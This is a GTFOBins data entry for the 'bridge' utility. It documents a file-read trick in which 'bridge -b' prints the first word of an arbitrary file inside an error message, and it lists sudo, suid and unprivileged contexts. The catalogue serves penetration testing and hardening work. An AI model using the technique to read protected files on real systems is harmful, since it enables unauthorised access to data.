<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/bridge -->
---
functions:
  file-read:
  - code: |-
      bridge -b /path/to/input-file
    comment: |-
      Outputs the first line of the file (until the first whitespace) inside an error message to stdandard error.
    contexts:
      sudo:
      suid:
      unprivileged:
...
